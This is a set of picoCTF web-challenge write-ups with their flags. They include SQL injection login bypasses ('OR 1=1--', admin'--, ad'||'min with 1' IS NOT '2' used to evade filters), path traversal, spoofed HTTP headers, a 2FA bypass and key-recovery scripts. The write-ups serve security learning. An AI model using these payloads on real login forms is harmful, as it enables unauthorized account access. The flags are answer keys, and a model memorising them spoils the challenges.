# Web Gauntlet
> Find the challenge [here](https://play.picoctf.org/practice/challenge/88?category=1&page=3)
> 
> [Solution video](https://www.youtube.com/watch?v=QBXciostsQQ)



In this challenge, we need to go through 5 rounds to get  the flag. As we progress in rounds, the number of values filtered will keep increasing. Note that password can be anything instead of `123`. 


### Round 1

Filter: `or`

Username: `admin' --`

Password: `123`

Actual Query: `SELECT * FROM users WHERE username='admin' -- AND password='123'`

### Round 2

Filter: `or and = like --`

Username: `admin' union select * from users where '1`

Password: `123`

Actual Query: `SELECT * FROM users WHERE username='admin' union select * from users where '1' AND password='123'`

`Note: The one I used in the video can also be used. Both will work.`

Username: `ad'||'min`

Password: `1' IS NOT '2`


### Round 3
Filter: `or and = like > < --`

Username: `admin';`

Password: `123`

Actual Query: `SELECT * FROM users WHERE username='admin';' AND password='123'`

### Round 4

Filter: `or and = like > < -- admin`

Username: `ad'||'min';`

Password: `123`

Actual Query: `SELECT * FROM users WHERE username='ad'||'min';' AND password='123'`

### Round 5
Filter: `or and = like > < -- union admin`

Username: `ad'||'min';`

Password: `123`

Actual Query: `SELECT * FROM users WHERE username='ad'||'min';' AND password='123'`

Congrats! all rounds have been passed. Refresh filter.php again it shows the source code of filter.php and flag is at the end of the page :)

`picoCTF{y0u_m4d3_1t_275cea1159781d5b3ef3f57e70be664a}`


# Web Gauntlet 2
> Find the challenge [here](https://play.picoctf.org/practice/challenge/174?category=1&page=2)
> 
> [Solution video](https://www.youtube.com/watch?v=u5dzBuEGx5c)

We can see on `filter.php` page that `admin` is filtered which means we can't directly put admin as username…we need to do some SQL injection. To bypass this we can simply use the `||` joiner with a final value for the username field of `ad'||'min`.

For the password field we must provide something that returns true. Most commonly used is `' OR '1'='1` but OR is filtered as seen in the filter.php file. Instead we can craft a true statement using `IS` or  `IS NOT` such as `1' IS NOT '2` which is also true but does not use anything in the filter.php file.


Final values for login:

```
username: ad'||'min
password: 1' IS NOT '2
```
Finally reloading filter.php, we will get our flag :)

`picoCTF{0n3_m0r3_t1m3_d5a91d8c2ae4ce567c2e8b8453305565}`

# Web Gauntlet 3
> Find the challenge [here](https://play.picoctf.org/practice/challenge/128?category=1&page=5)
> 
> [Solution video](https://www.youtube.com/watch?v=6roc0et71hQ)

Put the worries at ease and just use previous challenge tricks. Yes, it can be bypassed with the same credentials as the previous challenge.

```
username: ad'||'min
password: 1' IS NOT '2
```
`picoCTF{k3ep_1t_sh0rt_fc8788aa1604881093434ba00ba5b9cd}`



# Irish-Name-Repo 1
> Find the challenge [here](https://play.picoctf.org/practice/challenge/80?category=1&page=3)
> 
> [Solution video](https://www.youtube.com/watch?v=1agyblip8gM)

The challenge says to login and there is a `Admin Login` page given. One of the inquiry in Support page says `Hi. I tried adding my favorite Irish person, Conan O'Brien. But I keep getting something called a SQL Error` .This tells us that the site uses a SQL database. Let's try the most basic SQL Injection: 


`Note`:  Password can be anything in both the cases…it doesn't matter

Method 1: 

Username: `' OR 1=1--`
Password = `123 `


Method 2: 


Username = `admin'--`
Password = `123 `



The SQL query that checks the login is likely something like:

```sql
SELECT username, password FROM users WHERE username='$username' AND password='$password';
```

When we put in our injection, the query becomes:


```sql
SELECT username, password FROM users WHERE username='' OR 1=1--' AND password='123';
```

What is happening here is the query checks if the username is equal to nothing. Then, it checks OR 1=1. Since 1 is always going to be equal to 1, this returns true. The -- at the end simply comments out the rest of the query. This fools the server into letting us through the portal.



```sql
SELECT username, password FROM users WHERE username='admin'--' AND password='123';
```
What happened here is the query check if the username is equal to admin and since it does, the `--` comments rest of the query and won't check the password and simply get injected and give us the flag:)

`picoCTF{s0m3_SQL_f8adf3fb}`


# Irish-Name-Repo 2
> Find the challenge [here](https://play.picoctf.org/practice/challenge/59?category=1&page=4)
> 
> [Solution video](https://www.youtube.com/watch?v=rZgZIl90hcg)

This challenge will simply get injected with one of the methods of previous challenge. Simple put username as `admin'--` and password as whatever and get the flag :)

`picoCTF{m0R3_SQL_plz_aee925db}`


# Irish-Name-Repo 3
> Find the challenge [here](https://play.picoctf.org/practice/challenge/8?category=1&page=4)
> 
> [Solution Video](https://www.youtube.com/watch?v=DGwOS0pAu6w)


Now we are just given password field to input. Inspecting the page, we will find that there is more than one input, just that one of them is hidden and set to 0. Let's set it to 1 then we can actually see the query which we are inputting.
When we put the password as some random characters like `abcd` we will see password as `nopq` in the query. We can guess that this is some kind of substitution - `Caesar Cipher`.

This time, when we inject the same injection `' or 1=1--`, we get back our encrypted query:

```
password: ' or 1=1--
SQL query: SELECT * FROM admin where password = '' be 1=1--'
```

The characters for the word `OR` are substituted for `BE`. We try our query again, this time following the encryption, as so: `' be 1=1--`. The portal lets us through, and we finally see our flag :)

`picoCTF{3v3n_m0r3_SQL_7f5767f6}`


# JaWT Scratchpad
> Find the challenge [here](https://play.picoctf.org/practice/challenge/25?category=1&page=5)
>
> [Solution video](https://www.youtube.com/watch?v=Q-kexoYUfj0)



# Secrets
> Find the challenge [here](https://play.picoctf.org/practice/challenge/296?category=1&page=1)
>
> [Solution video]()

Through the description and the hint, we can guess that it is a path traversal challenge. On viewing the source code of `Home` page , we will find a path named 
`secret/assets/index.css`. `secret` rings a bell, let's try traversing to `secret/assets/`..umm..nothing…let's try just `secret/` okay, we are on the right track. Again `view page source` and let's go to `secret/hidden/` and again viewing this page source code and going to  `secret/hidden/superhidden` we will get to our flag page. But we can't see it, again `View Page Source` and there we got our flag :)

`picoCTF{succ3ss_@h3n1c@10n_51b260fe}`

# Client-Side-Again
> Find the challenge [here](https://play.picoctf.org/practice/challenge/69?category=1&page=3)
> 
> [Solution video](https://www.youtube.com/watch?v=87GIiXjDqig)

Inspecting the source code of the website, we will find a script containing variables with some strings like 'Password verified`, `picoCTF{`. This gives us the idea that the flag is scrambled in pieces in this line of code. Let's call a [Javascript Beautifier](http://www.jsnice.org/) in order to make the Javascript code a bit more readable. And after arranging and concatenating all these pieces, we will get the flag :)

`picoCTF{not_this_again_337115}`

# Who are you?
> Find the challenge [here](https://play.picoctf.org/practice/challenge/142?category=1&page=3)
> 
> [Solution video](https://www.youtube.com/watch?v=oeZ8zY6tccU)

As we open the website, it says `only offical PicoBrowser is allowed to access site` so, we intercept the request and change `User-Agent` to `PicoBrowser`.


Now it says it `doesnt accept viewer visting from another site`. So, we add a `referer` header to assure it. The Referer header allows a server to identify referring pages that people are visiting from or where requested resources are being used.

After that, it says `the website works only in 2018`. So, now we add a date header to assure the request is being made in 2018.


Npw, we get another message which asks us `not to be tracked` so we use `DNT`(Do Not Track Header). The DNT (Do Not Track) request header indicates the user’s tracking preference. It lets users indicate whether they would prefer privacy rather than personalized content.

Now, it says `the website is only for sweden people`. So we need to add another header `X-Forwarded-For` to help it identify the `IP Address` by putting any IP Address from google. 

Now its says `you dont speak swedish` so we have to change the language header to swedish. Finally, we get our flag :)

Here is the full intercepted and added header details:

```
GET / HTTP/1.1
Host: mercury.picoctf.net:36622
User-Agent: PicoBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: sv-sv,sv;q=0.5
Accept-Encoding: gzip, deflate
Referer: mercury.picoctf.net:36622
Connection: close
DNT: 1
X-Forwarded-For: 102.177.146.1
Date: 2018
Upgrade-Insecure-Requests: 1
```

`picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_79e451a7}`


# IntroToBurp
> Find the challenge [here](https://play.picoctf.org/practice/challenge/419?category=1&page=1)
> 
> [Solution Video](https://www.youtube.com/watch?v=FyRortvhMsw)

Okay, we need some `Burpsuite` here to intercept the `request` and get the flag. Put some random details on `Registration` page and check the response on Burpsuite's `Repeater`, a `2fa authentication` page will be opened. Just then, intercept the `GET` request header to `POST` and get the flag :)

`picoCTF{#0TP_Bypvss_SuCc3$S_e1eb16}`

# Java Script Kiddie
> Find the challenge [here](https://play.picoctf.org/practice/challenge/29?category=1&page=5)
> 
> [Solution video]()

On viewing page source code, we will find a `JS script` and on analysing the script we will find that it is actually scrambling a png image with a `16-digit` long key entered by the user on the website and only if correct key is entered, we can get a valid png image. 


In the initial lines of script, it sends a query to `/bytes` endpoint which returns numbers separated with space character. Then it’s being split up to create an array. The bytes variable stores bytes representing a (malformed) PNG image that's need to  be decrypted.


Let's analyse it by putting it in a hex-editor and comparing it with the [PNG file](https://en.wikipedia.org/wiki/PNG) header- the 16 bytes of png image which is always fixed. 
We will find some shifting in each of these 16 bytes. On counting each of these shifts (or better use this given python script) and concatenating it in a string, we will get a 16-digit number as the correct key which will produce a valid png image of  `bar code` and decoding it will give the flag :)

```python
LEN = 16
expected_bytes = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]
image_bytes = [128,252,182,115,177,211,142,252,189,248,130,93,154,0,68,90,131,255,204,170,239,167,18,51,233,43,0,26,210,72,95,120,227,7,195,126,207,254,115,53,141,217,0,11,118,192,110,0,0,170,248,73,103,78,10,174,208,233,156,187,185,65,228,0,137,128,228,71,159,10,111,10,29,96,71,238,141,86,91,82,0,214,37,114,7,0,238,114,133,0,140,0,38,36,144,108,164,141,63,2,69,73,15,65,68,0,249,13,0,64,111,220,48,0,55,255,13,12,68,41,66,120,188,0,73,27,173,72,189,80,0,148,0,64,26,123,0,32,44,237,0,252,36,19,52,0,78,227,98,88,1,185,1,128,182,177,155,44,132,162,68,0,1,239,175,248,68,91,84,18,223,223,111,83,26,188,241,12,0,197,57,89,116,96,223,96,161,45,133,127,125,63,80,129,69,59,241,157,0,105,57,23,30,241,62,229,128,91,39,152,125,146,216,91,5,217,16,48,159,4,198,23,108,178,199,14,6,175,51,154,227,45,56,140,221,0,230,228,99,239,132,198,133,72,243,93,3,86,94,246,156,153,123,1,204,200,233,143,127,64,164,203,36,24,2,169,121,122,159,40,4,25,64,0,241,9,94,220,254,221,122,8,22,227,140,221,248,250,141,66,78,126,190,73,248,105,5,14,26,19,119,223,103,165,69,177,68,61,195,239,115,199,126,61,41,242,175,85,211,11,5,250,93,79,194,78,245,223,255,189,0,128,9,150,178,0,112,247,210,21,36,0,2,252,144,59,101,164,185,94,232,59,150,255,187,1,198,171,182,228,147,73,149,47,92,133,147,254,173,242,39,254,223,214,196,135,248,34,146,206,63,127,127,22,191,92,88,69,23,142,167,237,248,23,215,148,166,59,243,248,173,210,169,254,209,157,174,192,32,228,41,192,245,47,207,120,139,28,224,249,29,55,221,109,226,21,129,75,41,113,192,147,45,144,55,228,126,250,127,197,184,155,251,19,220,11,241,171,229,213,79,135,93,49,94,144,38,250,121,113,58,114,77,111,157,146,242,175,236,185,60,67,173,103,233,234,60,248,27,242,115,223,207,218,203,115,47,252,241,152,24,165,115,126,48,76,104,126,42,225,226,211,57,252,239,21,195,205,107,255,219,132,148,81,171,53,79,91,27,174,235,124,213,71,221,243,212,38,224,124,54,77,248,252,88,163,44,191,109,63,189,231,251,189,242,141,246,249,15,0,2,230,7,244,161,31,42,182,219,15,221,164,252,207,53,95,99,60,190,232,78,255,197,16,169,252,100,164,19,158,32,189,126,140,145,158,116,245,68,94,149,111,252,74,135,189,83,74,71,218,99,220,208,87,24,228,11,111,245,1,0,98,131,46,22,94,71,244,22,147,21,83,155,252,243,90,24,59,73,247,223,127,242,183,251,124,28,245,222,199,248,122,204,230,79,219,147,11,225,202,239,24,132,55,89,221,143,151,137,63,150,79,211,8,16,4,60,63,99,65,0,2]

key = []

for key_idx in range(LEN):
    for shifter in range(10):  # all digits
        offset = ((shifter * LEN) % len(image_bytes)) + key_idx
        if expected_bytes[key_idx] == image_bytes[offset]:
            key.append(shifter)
            break

print("Key: ", end="")
print(*key, sep="")
print("Key Length: {}".format(len(key)))
```
```
Output:
Key: 4894748485167104
Key Length: 16
```

`picoCTF{7b15cfb95f05286e37a22dda25935e1e}`


# Java Script Kiddie 2
> Find the challenge [here](https://play.picoctf.org/practice/challenge/33?category=1&page=5)
> 
> [Solution video](https://www.youtube.com/watch?v=YV3gsyyWF4Y)

Kiddie 2 is just as same as Kiddie 1, except for this line: `shifter = Number(key.slice((i*2),(i*2)+1));`. This effectively ignores every second value in the key. Since `var LEN = 16` is the same, the script for the previous challenge can be used again but with a random value (I will just repeat a number two times) added between characters. 


For each character of the key, this script will try all digits until one is found that places the expected value in the current location and will give a valid png image of  `bar code` and decoding it will give the flag :)

```python
LEN = 16
expected_bytes = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]
image_bytes = [252,127,185,254,13,114,103,73,255,0,0,13,231,72,219,16,59,96,78,211,0,159,239,10,62,0,0,0,66,192,242,71,20,140,1,9,118,53,68,114,248,120,156,237,73,81,162,187,160,125,0,134,173,73,60,65,112,14,208,163,0,55,252,71,48,119,134,121,244,29,251,116,69,192,229,223,155,201,223,0,157,186,146,0,134,157,175,251,0,227,124,15,56,33,255,82,191,80,12,71,181,0,170,31,1,56,239,188,7,206,232,108,137,0,241,114,98,10,119,17,84,253,34,83,2,209,130,227,0,0,95,2,227,0,0,80,97,36,145,72,243,57,68,35,164,12,7,127,183,73,26,120,113,239,252,247,17,98,95,58,48,213,8,163,33,3,1,171,66,13,236,67,146,113,138,254,205,192,145,219,156,0,68,208,14,2,246,56,248,79,216,239,203,10,136,147,64,122,121,231,6,81,142,181,237,249,73,136,165,243,57,241,125,252,5,20,144,20,40,19,255,146,89,51,188,76,244,218,127,107,145,68,217,202,41,3,199,149,59,42,136,246,123,182,242,252,250,72,61,127,16,175,0,121,135,73,128,36,112,88,8,33,0,123,250,1,246,56,50,88,144,240,83,186,27,136,208,239,163,238,1,156,205,221,249,191,17,240,124,99,0,19,155,0,243,172,228,114,48,215,255,28,254,51,121,122,28,90,223,25,25,43,203,243,246,45,7,115,252,72,145,108,219,156,200,21,44,210,156,101,172,161,166,123,231,82,255,0,255,211,22,40,9,173,219,58,155,187,144,212,245,221,25,169,157,43,46,249,63,172,208,204,201,90,75,133,145,245,234,50,143,32,183,84,191,252,144,172,161,160,91,41,39,128,143,195,178,151,123,114,88,197,94,51,4,241,110,92,190,77,199,254,63,35,40,107,240,62,101,130,152,143,155,199,31,162,253,112,214,118,130,252,113,211,90,243,34,35,42,90,44,112,233,87,158,242,237,99,19,160,5,222,40,203,178,14,172,201,235,10,222,223,128,191,75,241,37,135,217,227,69,99,5,74,201,103,16,251,75,249,115,41,25,171,34,214,185,252,154,95,104,68,245,127,156,67,115,221,21,233,251,74,252,253,213,103,171,32,233,129,251,230,245,206,210,173,156,246,186,111,195,129,7,242,207,111,6,0,190,144,91,163,233,250,218,247,126,242,240,110,108,255,176,116,155,114,136,41,211,101,251,165,249,181,51,238,185,69,181,147,151,210,249,154,62,105,85,123,127,237,155,95,254,234,251,116,25,43,230,91,59,56,48,223,146,35,191,223,61,147,42,230,111,90,131,95,245,174,57,248,249,252,140,155,95,177,158,163,25,146,149,57,93,7,114,16,252,54,191,159,183,210,121,239,192,5,198,30,31,91,103,129,219,69,78,201,29,12,150,201,149,157,173,63,217,41,0,215,175,105,63,119,122,203,201,113,58,190,48,252,85,183,147,248,252,247,237,207,99,242,231,229,57,121,212,254,15,91,127,30,227,246,207,252,222,240,0,254,172,254,112,78,68,174,188,96,141,140]

key = []

for key_idx in range(LEN):
    for shifter in range(10):  # all digits
        offset = ((shifter * LEN) % len(image_bytes)) + key_idx
        if expected_bytes[key_idx] == image_bytes[offset]:
            key.append(shifter)
            key.append(shifter)
            break

print("Key: ", end="")
print(*key, sep="")
print("Key Length: {}".format(len(key)))
```
```
Output:

Key: 77661166007799115500000022008855
Key Length: 32
```

`picoCTF{227c2d3465a6a4bcc8a1bc599e34f074}`
